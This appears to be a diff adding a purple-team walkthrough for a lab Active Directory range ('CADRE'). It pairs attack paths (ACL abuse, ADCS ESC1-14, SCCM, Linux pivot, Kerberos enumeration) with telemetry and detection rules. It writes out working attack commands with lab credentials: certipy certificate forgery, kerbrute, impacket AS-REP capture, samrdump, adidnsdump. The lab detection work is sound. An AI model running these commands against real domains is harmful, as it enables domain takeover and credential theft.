+<tr>
+<td><strong>Stream</strong></td>
+<td>MITRE Gap — G</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1074 (Data Staged)</td>
+<td>T1113 (Screen Capture)</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td><code>robocopy C:\Shares\restricted C:\Temp\staging *.docx *.xlsx *.pdf /S</code></td>
+<td>PowerShell keylogger</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>SyEID 11 (file create); Endpt file</td>
+<td>Endpt API (keyboard hooks); SyEID 1 (PS)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>Branch A: ACL Abuse (cadre.local)</h2>
+<p><strong>Diverges from:</strong> Phase 4 (BH reveals ACEs). <strong>Converges to:</strong> Phase 5+. <strong>Prerequisite:</strong> Any cadre.local domain credential.</p>
+<h3>WT015 — ForceChangePassword (Fastest to DA)</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>015</td>
+</tr>
+<tr>
+<td><strong>ACE#</strong></td>
+<td>7 (hunter_dfir → chief_command: ForceChangePassword)</td>
+</tr>
+<tr>
+<td><strong>Playbook</strong></td>
+<td><code>05-ad-attack-surface.yml</code></td>
+</tr>
+<tr>
+<td><strong>From</strong></td>
+<td>provisioning → dc01 (.10)</td>
+</tr>
+<tr>
+<td><strong>What it earns</strong></td>
+<td><code>C0mm@nd_Ch1ef!</code> → Domain Admin cadre.local</td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WE 4738 (password change), 4724, 4624; Zeek ldap.log</td>
+</tr>
+</tbody>
+</table>
+<h3>WT013 — WriteDacl Self-Escalate</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>013</td>
+</tr>
+<tr>
+<td><strong>ACE#</strong></td>
+<td>3 (Engineering-Cadre → Red-Cadre: WriteDacl)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Grant GenericAll to self on Red-Cadre, then add self as member</td>
+</tr>
+</tbody>
+</table>
+<h3>WT014 — GenericWrite → Shadow Credentials</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>014</td>
+</tr>
+<tr>
+<td><strong>ACE#</strong></td>
+<td>4 (Cloud-Cadre → Agentic-Cadre: GenericWrite)</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Add KeyCredentialLink to group member, PKINIT auth</td>
+</tr>
+</tbody>
+</table>
+<h3>WT016 — GenericAll on OU</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>016</td>
+</tr>
+<tr>
+<td><strong>ACE#</strong></td>
+<td>5 (analyst_dfir → OU=Command: GenericAll)</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td><code>analyst_dfir</code> resets <code>chief_command</code>'s password via OU inheritance</td>
+</tr>
+</tbody>
+</table>
+<h3>WT023 — GPO Abuse</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>023</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1484 (Group Policy Modification)</td>
+</tr>
+<tr>
+<td><strong>ACE#</strong></td>
+<td>1 (analyst_cloud → Vulnerable-GPO: GpoEditDeleteModifySecurity)</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>Modify Vulnerable-GPO (linked to OU=Command) → code exec as <code>chief_command</code></td>
+</tr>
+<tr>
+<td><strong>Key telemetry</strong></td>
+<td>WE 4688; SyEID 1; Endpt process</td>
+</tr>
+</tbody>
+</table>
+<h3>WT024 — gMSA Extraction</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>024</td>
+</tr>
+<tr>
+<td><strong>Att&amp;ck</strong></td>
+<td>T1555.002 (gMSA)</td>
+</tr>
+<tr>
+<td><strong>ACE#</strong></td>
+<td>10 (eng_cloud → gmsaTools$: ReadGMSAPassword)</td>
+</tr>
+</tbody>
+</table>
+<h3>WT027 — SPN Jacking (CVE-2026-25177)</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>027</td>
+</tr>
+<tr>
+<td><strong>ACE#</strong></td>
+<td>25 (analyst_malware → self: WriteProperty(SPN))</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>Register homoglyph SPN to intercept TGS requests</td>
+</tr>
+</tbody>
+</table>
+<h3>WT008 — Shadow Credentials (dc01$)</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>008</td>
+</tr>
+<tr>
+<td><strong>ACE#</strong></td>
+<td>6 (ops_redcell → dc01$: GenericWrite)</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>KeyCredentialLink on dc01$ → authenticate as DC → DCSync</td>
+</tr>
+</tbody>
+</table>
+<h3>WT025 — AdminSDHolder Persistence</h3>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>WT#</strong></td>
+<td>025</td>
+</tr>
+<tr>
+<td><strong>What it does</strong></td>
+<td>GenericAll on AdminSDHolder → SDPROP propagates to all protected groups</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>Branch B: ADCS (WT050-062)</h2>
+<p><strong>Diverges from:</strong> Phase 4. <strong>Converges to:</strong> Phase 7. <strong>CA:</strong> dc01.cadre.local — <code>cadre-CA</code>.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">ESC#</th>
+<th style="text-align: center;">WT#</th>
+<th style="text-align: left;">Vulnerability</th>
+<th style="text-align: left;">What it earns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">ESC1</td>
+<td style="text-align: center;">050</td>
+<td style="text-align: left;">Manager approval=False + Enroll rights</td>
+<td style="text-align: left;">DA certificate</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC2</td>
+<td style="text-align: center;">051</td>
+<td style="text-align: left;">Any purpose EKU + enroll rights</td>
+<td style="text-align: left;">DA cert</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC3</td>
+<td style="text-align: center;">052</td>
+<td style="text-align: left;">Enrollment agent + OID mismatch</td>
+<td style="text-align: left;">Any user cert</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC4</td>
+<td style="text-align: center;">053</td>
+<td style="text-align: left;">Template ACL Write</td>
+<td style="text-align: left;">Template modification</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC5</td>
+<td style="text-align: center;">054</td>
+<td style="text-align: left;">CA object ACL</td>
+<td style="text-align: left;">Full CA control</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC6</td>
+<td style="text-align: center;">055</td>
+<td style="text-align: left;">EDITF_ATTRIBUTESUBJECTALTNAME2</td>
+<td style="text-align: left;">SAN abuse</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC7</td>
+<td style="text-align: center;">056</td>
+<td style="text-align: left;">CA Manager bypass</td>
+<td style="text-align: left;">Approve own request</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC8</td>
+<td style="text-align: center;">057</td>
+<td style="text-align: left;">NTLM relay to ADCS Web enroll</td>
+<td style="text-align: left;">Machine certs</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC9</td>
+<td style="text-align: center;">058</td>
+<td style="text-align: left;">No security extension + weak mapping</td>
+<td style="text-align: left;">Alt security ID</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC10</td>
+<td style="text-align: center;">059</td>
+<td style="text-align: left;">Weak cert mapping registry</td>
+<td style="text-align: left;">Logon as DA</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC11</td>
+<td style="text-align: center;">060</td>
+<td style="text-align: left;">No PKIInitiateRequest protection</td>
+<td style="text-align: left;">Cert via RPC</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC13</td>
+<td style="text-align: center;">061</td>
+<td style="text-align: left;">OID-to-group mapping</td>
+<td style="text-align: left;">EA via cert</td>
+</tr>
+<tr>
+<td style="text-align: center;">ESC14</td>
+<td style="text-align: center;">062</td>
+<td style="text-align: left;">Subject/altSecID mapping writable</td>
+<td style="text-align: left;">Auth as target</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Common pattern:</strong></p>
+<pre><code class="language-bash">certipy-ad req -ca cadre-CA -template ESC1-Template -upn administrator@cadre.local \
+  -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -dc-ip 192.168.77.10
+certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.77.10
+</code></pre>
+<hr />
+<h2>Branch C: SCCM Escalation (WT034-039, WT030, WT049)</h2>
+<p><strong>Diverges from:</strong> Phase 8 (cross-forest → svc_sccm). <strong>Converges to:</strong> Phase 8 (NAA → range DA).<br />
+<strong>SCCM Site:</strong> mbr02 (.23), site code <code>CAD</code>. <strong>Tools:</strong> SharpSCCM.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">WT#</th>
+<th style="text-align: left;">Technique</th>
+<th style="text-align: left;">Earning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">034</td>
+<td style="text-align: left;">NAA Extraction</td>
+<td style="text-align: left;">Range DA (fastest)</td>
+</tr>
+<tr>
+<td style="text-align: center;">035</td>
+<td style="text-align: left;">PXE Boot Abuse</td>
+<td style="text-align: left;">Task seq creds</td>
+</tr>
+<tr>
+<td style="text-align: center;">036</td>
+<td style="text-align: left;">Client Push Relay</td>
+<td style="text-align: left;">SMB relay</td>
+</tr>
+<tr>
+<td style="text-align: center;">037</td>
+<td style="text-align: left;">CMPivot Abuse</td>
+<td style="text-align: left;">Client query exec</td>
+</tr>
+<tr>
+<td style="text-align: center;">038</td>
+<td style="text-align: left;">App Deployment</td>
+<td style="text-align: left;">All-client code exec</td>
+</tr>
+<tr>
+<td style="text-align: center;">039</td>
+<td style="text-align: left;">Site Takeover</td>
+<td style="text-align: left;">Site server control</td>
+</tr>
+<tr>
+<td style="text-align: center;">030</td>
+<td style="text-align: left;">WSUS Abuse</td>
+<td style="text-align: left;">WSUS push</td>
+</tr>
+<tr>
+<td style="text-align: center;">049</td>
+<td style="text-align: left;">VSC Enrollment</td>
+<td style="text-align: left;">Cert enrollment</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>Branch D: Linux Pivot (WT044-048)</h2>
+<p><strong>Diverges from:</strong> Phase 3 (MSSQL linked-server recon). <strong>Converges to:</strong> Phase 6.<br />
+<strong>Target:</strong> linux01 (192.168.77.40). Requires root.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">WT#</th>
+<th style="text-align: center;">Phase</th>
+<th style="text-align: left;">Technique</th>
+<th style="text-align: left;">Playbook</th>
+<th style="text-align: left;">What it earns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">044</td>
+<td style="text-align: center;">Entry</td>
+<td style="text-align: left;">MSSQL linked-server recon</td>
+<td style="text-align: left;"><code>16-supplychain.yml</code> — MSSQL on linux01</td>
+<td style="text-align: left;">SQL query access</td>
+</tr>
+<tr>
+<td style="text-align: center;">048</td>
+<td style="text-align: center;">Entry</td>
+<td style="text-align: left;">Podman container escape</td>
+<td style="text-align: left;"><code>07-linux-config.yml</code> — privileged podman</td>
+<td style="text-align: left;">Root on linux01</td>
+</tr>
+<tr>
+<td style="text-align: center;">045</td>
+<td style="text-align: center;">2</td>
+<td style="text-align: left;">SSSD ticket extraction</td>
+<td style="text-align: left;">N/A (standard LAD artifact)</td>
+<td style="text-align: left;">Cached Kerberos tickets</td>
+</tr>
+<tr>
+<td style="text-align: center;">047</td>
+<td style="text-align: center;">3</td>
+<td style="text-align: left;">NFS krb5p mount</td>
+<td style="text-align: left;"><code>07-linux-config.yml</code> — NFS export</td>
+<td style="text-align: left;">NFS share access</td>
+</tr>
+<tr>
+<td style="text-align: center;">046</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: left;">MSSQL keytab extraction</td>
+<td style="text-align: left;"><code>07-linux-config.yml</code> — keytab</td>
+<td style="text-align: left;">MSSQL service credential</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>Removed / Non-functional</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">WT#</th>
+<th style="text-align: left;">Reason</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">028</td>
+<td style="text-align: left;">❌ Invalid — SAMR null bind blocked by Server 2025 <code>RestrictAnonymousSAM=1</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">031</td>
+<td style="text-align: left;">⏳ Pending relocation — valid technique, needs user list source</td>
+</tr>
+<tr>
+<td style="text-align: center;">018</td>
+<td style="text-align: left;">❌ Non-functional — <code>\PIPE\efsrpc</code> blocked on Server 2025</td>
+</tr>
+<tr>
+<td style="text-align: center;">019</td>
+<td style="text-align: left;">❌ Non-functional — SMB-pipe DCE-RPC not detectable by Suricata 8.0.5</td>
+</tr>
+<tr>
+<td style="text-align: center;">020</td>
+<td style="text-align: left;">❌ Non-functional — MS-FSRVP service not available on Server 2025</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>E — Network Defense Exercises (14 standalone)</h2>
+<blockquote>
+<p>Run from linux01 or provisioning. Each triggers Suricata SID or Zeek notice. See <code>04-automation/campaign-e/</code>.</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">WT#</th>
+<th style="text-align: left;">SID/Notice</th>
+<th style="text-align: left;">Index</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">069</td>
+<td style="text-align: left;">SID:1000025</td>
+<td style="text-align: left;"><code>logs-suricata-*</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">070</td>
+<td style="text-align: left;">SID:1000026</td>
+<td style="text-align: left;"><code>logs-suricata-*</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">071</td>
+<td style="text-align: left;">SID:1000027 rev:2</td>
+<td style="text-align: left;"><code>logs-suricata-*</code>, <code>zeek.notice</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">072</td>
+<td style="text-align: left;">SID:1000028</td>
+<td style="text-align: left;"><code>logs-suricata-*</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">073</td>
+<td style="text-align: left;">SID:1000029 rev:2</td>
+<td style="text-align: left;"><code>logs-suricata-*</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">074</td>
+<td style="text-align: left;">SID:1000010</td>
+<td style="text-align: left;"><code>logs-suricata-*</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">075</td>
+<td style="text-align: left;">ET:2000012</td>
+<td style="text-align: left;"><code>logs-suricata-*</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">076</td>
+<td style="text-align: left;">ET:2000041</td>
+<td style="text-align: left;"><code>logs-suricata-*</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">077</td>
+<td style="text-align: left;">ET:2000070</td>
+<td style="text-align: left;"><code>logs-suricata-*</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">078</td>
+<td style="text-align: left;">ET:2000072</td>
+<td style="text-align: left;"><code>logs-suricata-*</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">079</td>
+<td style="text-align: left;">ET:2000060</td>
+<td style="text-align: left;"><code>logs-suricata-*</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">080</td>
+<td style="text-align: left;">Z9 (cadre-conn-beacon)</td>
+<td style="text-align: left;"><code>zeek.notice</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">081</td>
+<td style="text-align: left;">Z1 (cadre-outbound)</td>
+<td style="text-align: left;"><code>zeek.notice</code></td>
+</tr>
+<tr>
+<td style="text-align: center;">093</td>
+<td style="text-align: left;">AES-256 encrypt</td>
+<td style="text-align: left;">Sysmon EID 11, Endpt file</td>
+</tr>
+</tbody>
+</table>
+<h2>F — Supply-Chain Exercises (10 standalone)</h2>
+<blockquote>
+<p>npm threat emulation on linux01. Detected via auditd + Zeek.</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">F-#</th>
+<th style="text-align: left;">Detection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">F-01</td>
+<td style="text-align: left;">auditd process + Zeek HTTP POST</td>
+</tr>
+<tr>
+<td style="text-align: center;">F-02</td>
+<td style="text-align: left;">auditd process + Zeek HTTP</td>
+</tr>
+<tr>
+<td style="text-align: center;">F-03</td>
+<td style="text-align: left;">auditd file-watch</td>
+</tr>
+<tr>
+<td style="text-align: center;">F-04</td>
+<td style="text-align: left;">auditd file-watch</td>
+</tr>
+<tr>
+<td style="text-align: center;">F-05</td>
+<td style="text-align: left;">auditd process + Zeek</td>
+</tr>
+<tr>
+<td style="text-align: center;">F-06</td>
+<td style="text-align: left;">auditd npm exec</td>
+</tr>
+<tr>
+<td style="text-align: center;">F-07</td>
+<td style="text-align: left;">auditd process + Zeek HTTP</td>
+</tr>
+<tr>
+<td style="text-align: center;">F-08</td>
+<td style="text-align: left;">auditd git commit hooks</td>
+</tr>
+<tr>
+<td style="text-align: center;">F-09</td>
+<td style="text-align: left;">auditd bundle exec</td>
+</tr>
+<tr>
+<td style="text-align: center;">F-10</td>
+<td style="text-align: left;">Zeek HTTP POST (custom rule)</td>
+</tr>
+<tr>
+<td style="text-align: center;">---</td>
+<td style="text-align: left;"></td>
+</tr>
+</tbody>
+</table>
+<h2>Phase 0 — Reconnaissance (From Zero Credentials)</h2>
+<blockquote>
+<p><strong>Status:</strong> Steps 1-2 tested 2026-06-23; Steps 3-6 untested (require credentials)<br />
+<strong>Goal:</strong> Identify valid domain users, network topology, and authentication surface without any credentials<br />
+<strong>Source:</strong> <code>CAMPAIGNS.md</code> lines 94-281 (Phase 0 section)</p>
+</blockquote>
+<h3>Phase 0 Step 1 — Full Port/Service Scan (nmap)</h3>
+<p><strong>Tested 2026-06-23.</strong> nmap against all 7 VMs identified open ports and SMB signing requirements. Results in CAMPAIGNS.md table (lines 105-112).</p>
+<h4>Why it works</h4>
+<p>TCP/UDP port scan reveals attack surface — what services are listening, what versions, what OS. Critical for choosing attack vectors: SMB signing NOT required on member servers = NTLM relay viable; ADWS on 9389 = potential recon path.</p>
+<h4>Attack command</h4>
+<pre><code class="language-bash">nmap -Pn -sV -sC -p- --min-rate 5000 -T4 192.168.77.10,11,12,22,23,40,50,51,55
+</code></pre>
+<h4>What to expect (success)</h4>
+<pre><code>Nmap scan report for 192.168.77.11
+...
+PORT      STATE  SERVICE      VERSION
+22/tcp    open   ssh          OpenSSH ...
+53/tcp    open   domain       (generic DNS response)
+88/tcp    open   kerberos-sec Microsoft Kerberos
+135/tcp   open   msrpc        Microsoft Windows RPC
+139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open   ldap         Microsoft AD LDAP
+445/tcp   open   microsoft-ds Microsoft Windows ...
+...
+</code></pre>
+<h4>What to expect (failure modes)</h4>
+<ul>
+<li><code>-Pn</code> skips host discovery (needed since DC firewalls may block ICMP). If you remove it, scans hang on "Host seems down".</li>
+<li><code>--min-rate 5000</code> is aggressive. If you see "1+ hosts failed" or partial output, reduce to 1000.</li>
+<li><code>p-</code> is full port scan. On slow networks this can take 10+ minutes.</li>
+</ul>
+<h4>CADRE-specific notes</h4>
+<ul>
+<li>All 7 VMs use Vagrant-assigned MACs starting with <code>00:0C:29:...</code> (VMware)</li>
+<li>SMB signing <strong>required</strong> on all 3 DCs (192.168.77.10, .11, .12) — NTLM relay to DCs blocked</li>
+<li>SMB signing <strong>NOT required</strong> on mbr01 (.20), mbr02 (.23) — NTLM relay viable</li>
+<li>Member servers: MSSQL 2022 on mbr01 (.22), SCCM on mbr02 (.23)</li>
+<li>Linux: linux01 (.40) has MSSQL Linux + NFS + SSH</li>
+</ul>
+<h4>Telemetry fingerprint</h4>
+<ul>
+<li>nmap scan appears in firewall logs on each scanned host</li>
+<li>IDS/IPS rules detect nmap service version probes (Suricata <code>ET SCAN</code> signatures)</li>
+<li>Windows Defender ATP alerts on internal port scans</li>
+</ul>
+<h4>Detection engineering</h4>
+<ul>
+<li>Suricata <code>ET SCAN</code> signatures fire on SYN scans, NULL scans, XMAS scans</li>
+<li>Zeek <code>conn.log</code> shows connection attempts to all ports; <code>notice.log</code> for unusual patterns</li>
+<li>Elastic cadre-* rules should alert on internal port scans from non-admin sources</li>
+</ul>
+<h4>Common pitfalls</h4>
+<ul>
+<li>Running without <code>-Pn</code> on lab VMs that block ICMP = silent failure</li>
+<li>Running on Windows host = nmap uses Npcap — may need admin privileges for raw packet capture</li>
+<li>Output is too long for terminal — use <code>nmap ... -oN /tmp/scan.txt</code> for file output</li>
+</ul>
+<hr />
+<h3>Phase 0 Step 2 — Kerberos User Enumeration (nmap krb5-enum-users / kerbrute)</h3>
+<p><strong>Tested 2026-06-23.</strong> nmap <code>krb5-enum-users</code> got <code>principal_unknown</code> for malformed cnames (nmap script bug bundles comma-separated users per cname). <strong>AS-REP captured for <code>intern_blue</code></strong> which has <code>DONT_REQUIRE_PREAUTH</code>. kerbrute is the canonical replacement.</p>
+<h4>Why it works</h4>
+<p>Kerberos AS-REQ can be sent with a guessed <code>cname</code> and constant <code>sname=krbtgt/&lt;realm&gt;</code>. The KDC's response code reveals user validity:<br />
+- <code>preauth_required</code> (26) = user exists<br />
+- <code>principal_unknown</code> (6) = user doesn't exist<br />
+- AS-REP (msg-type 11) = user exists with DONT_REQUIRE_PREAUTH (AS-REP Roast target)</p>
+<p>Modern Server 2025 KDC requires PA-ETYPE-INFO2 pre-auth (RFC 6806) which older nmap scripts may not send, causing uniform error responses. <strong>kerbrute</strong> sends modern pre-auth and works correctly.</p>
+<h4>Attack commands</h4>
+<pre><code class="language-bash"># Broken on Server 2025 (nmap 7.99 bug — bundles comma-separated users per cname)
+nmap -Pn -p 88 --script=krb5-enum-users \
+  --script-args='krb5-enum-users.realm=child.cadre.local,userdb=/tmp/users.txt' \
+  192.168.77.11
+
+# Canonical replacement — works on Server 2025
+kerbrute userenum -d child.cadre.local --dc 192.168.77.11 /tmp/users.txt
+
+# Capture AS-REPs (Phase 1)
+impacket-GetNPUsers child.cadre.local/ -dc-ip 192.168.77.11 -no-pass -usersfile /tmp/users.txt -format hashcat &gt; /tmp/asrep.txt
+</code></pre>
+<h4>What to expect (success — kerbrute)</h4>
+<pre><code>[+] VALID USERNAME: administrator@child.cadre.local
+[+] VALID USERNAME: guest@child.cadre.local
+[+] VALID USERNAME: krbtgt@child.cadre.local
+[+] VALID USERNAME: vagrant@child.cadre.local
+[+] VALID USERNAME: intern_blue@child.cadre.local
+[+] VALID USERNAME: analyst_t1@child.cadre.local
+... (10+ valid users in ~10 seconds)
+</code></pre>
+<h4>What to expect (failure modes)</h4>
+<ul>
+<li><strong>nmap <code>krb5-enum-users</code> returns 0 users on Server 2025</strong> — nmap 7.99 script bug + KDC hardened behavior. Use kerbrute.</li>
+<li><strong>kerbrute "all users invalid"</strong> — verify <code>/tmp/users.txt</code> has 1 user per line; check network connectivity to DC</li>
+<li><strong>AS-REP for only one user (intern_blue)</strong> — that's expected; intern_blue is the only DONT_REQUIRE_PREAUTH account in CADRE</li>
+<li><strong>TCP RST after 5 requests</strong> — KDC rate limit; kerbrute handles this by opening new TCP connections</li>
+</ul>
+<h4>CADRE-specific notes</h4>
+<ul>
+<li><code>intern_blue</code> is the only DONT_REQUIRE_PREAUTH user — set by <code>05-ad-attack-surface.yml</code> lines 859-866</li>
+<li>All other users have preauth_required (default)</li>
+<li><code>cadre_passwords.txt</code> (in <code>ansible/files/</code>) contains the lab passwords — use as wordlist</li>
+<li>5 userdb lines from CAMPAIGNS.md produce 5 AS-REQ packets (nmap 7.99 bug treats each line as one cname)</li>
+<li>AS-REP etype observed: 23 (RC4-HMAC) → hashcat mode 18200</li>
+</ul>
+<h4>Telemetry fingerprint</h4>
+<ul>
+<li><strong>WinSec 4768</strong> (TGT request) per AS-REQ — high volume in short time = enumeration</li>
+<li><strong>WinSec 4625</strong> (logon failure) NOT generated for AS-REQ without pre-auth (no actual auth attempt)</li>
+<li><strong>Zeek <code>kerberos.log</code></strong> captures every AS-REQ/AS-REP with cname, sname, error_code</li>
+<li>Suricata cadre-ad rules: SID:1000015 (Kerberoast burst) fires on rapid AS-REQ pattern</li>
+</ul>
+<h4>Detection engineering</h4>
+<ul>
+<li><strong>Suricata SID:1000015</strong> ("CADRE Kerberos AS-REQ burst") — fires on 5+ AS-REQs in 60s</li>
+<li><strong>Elastic cadre-001</strong> (planned) — pattern match on Zeek kerberos.log for <code>error_code=6</code> from same source IP</li>
+<li><strong>Volume rule</strong> — &gt;50 Kerberos requests from single source in 5min = enumeration</li>
+</ul>
+<h4>Common pitfalls</h4>
+<ul>
+<li><strong><code>/tmp/users.txt</code> with trailing whitespace</strong> — nmap may include whitespace in cname</li>
+<li><strong>kerbrute path not in PATH</strong> — <code>wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute</code></li>
+<li><strong>Realm typo</strong> — <code>child.cadre.local</code> (lowercase) vs <code>CHILD.CADRE.LOCAL</code> (uppercase) — kerbrute auto-handles</li>
+<li><strong>AS-REQ gets principal_unknown for ALL users</strong> — modern KDC; need modern tool (kerbrute)</li>
+</ul>
+<h4>Wireshark field reference</h4>
+<ul>
+<li>Filter to specific user: <code>kerberos.cname contains "intern_blue"</code></li>
+<li>Filter to AS-REPs only: <code>kerberos.msg_type == 11</code></li>
+<li>Filter to errors only: <code>kerberos.msg_type == 30</code></li>
+<li>Filter to preauth_required errors: <code>kerberos.error_code == 26</code></li>
+<li>The <code>cname</code> field in the response = the <code>cname</code> in the request (proves which user was tested)</li>
+<li><code>sname</code> is always <code>krbtgt/&lt;REALM&gt;</code> in AS-REQ/AS-REP</li>
+</ul>
+<hr />
+<h3>Phase 0 Step 3 — ADWS Enumeration (port 9389) ⏳</h3>
+<p><strong>Status:</strong> Not yet tested. Port 9389 confirmed open on all 3 DCs (nmap 2026-06-18).</p>
+<h4>Why it works</h4>
+<p>Active Directory Web Services (ADWS) provides SOAP-based enumeration on port 9389. Server 2025 may allow enumeration via ADWS even when LDAP anonymous is blocked — different authentication path.</p>
+<h4>Attack command (planned)</h4>
+<pre><code class="language-bash"># From Kali
+nmap -p 9389 --script=adws-enum 192.168.77.11
+# OR use SOAPHound / adws-enum Python tools (requires auth for full functionality)
+</code></pre>
+<h4>What to expect (success)</h4>
+<ul>
+<li>Service detected: SOAP XML envelope accepted</li>
+<li>Returns DCInfo (forest, domain, sites) without auth</li>
+<li>Full user/group enumeration requires auth</li>
+</ul>
+<h4>What to expect (failure modes)</h4>
+<ul>
+<li>SOAP 401 Unauthorized for full enumeration without creds</li>
+<li>Port 9389 filtered by firewall</li>
+<li>TLS required — verify with <code>openssl s_client -connect 192.168.77.11:9389</code></li>
+</ul>
+<h4>CADRE-specific notes</h4>
+<ul>
+<li>All 3 DCs (dc01, dc02, dc03) have ADWS on 9389 (per 04-vulnerabilities.yml)</li>
+<li>Will be tested once we have at least one valid credential</li>
+</ul>
+<hr />
+<h3>Phase 0 Step 4 — DNS Enumeration via adidnsdump ⏳</h3>
+<p><strong>Status:</strong> Not yet tested. Requires credentials.</p>
+<h4>Why it works</h4>
+<p>AD-integrated DNS allows any authenticated user to query all DNS records. adidnsdump enumerates the zone including records the user has no explicit read rights to. Useful for discovering:<br />
+- Cloud Sync endpoints<br />
+- Internal service records<br />
+- Unpublicized hosts not in BloodHound</p>
+<h4>Attack command (planned)</h4>
+<pre><code class="language-bash">adidnsdump -u cadre.local\\intern_blue -p '1nt3rn_Blu3!' dc01.cadre.local
+</code></pre>
+<h4>What to expect (success)</h4>
+<ul>
+<li><code>records.csv</code> and <code>zones/</code> directory created</li>
+<li>All A, AAAA, CNAME, MX records listed</li>
+<li>SOA record with primary DNS</li>
+</ul>
+<h4>CADRE-specific notes</h4>
+<ul>
+<li>Will be tested after Phase 1 (intern_blue credential obtained)</li>
+</ul>
+<hr />
+<h3>Phase 0 Step 5 — SAMR Enumeration ⏳</h3>
+<p><strong>Status:</strong> Not yet tested. Requires credentials.</p>
+<h4>Why it works</h4>
+<p>SAMR (MS-SAMR over port 445) returns the same user data as LDAP but uses the RPC pipe that backup agents, inventory tools use daily — blends into baseline. Less likely to trigger LDAP-specific alerts.</p>
+<h4>Attack command (planned)</h4>
+<pre><code class="language-bash">python3 samrdump.py cadre.local/intern_blue:'1nt3rn_Blu3!'@192.168.77.10
+# OR via impacket: impacket-samrdump
+</code></pre>
+<h4>What to expect (success)</h4>
+<ul>
+<li>samAccountName, lastLogon (FILETIME), logonCount for every user</li>
+<li>Machine accounts (with <code>$</code> suffix)</li>
+<li>Works against any DC</li>
+</ul>
+<h4>CADRE-specific notes</h4>
+<ul>
+<li>Will be tested after Phase 1</li>
+<li>Compare LDAP vs SAMR output to verify they're equivalent</li>
+</ul>
+<hr />
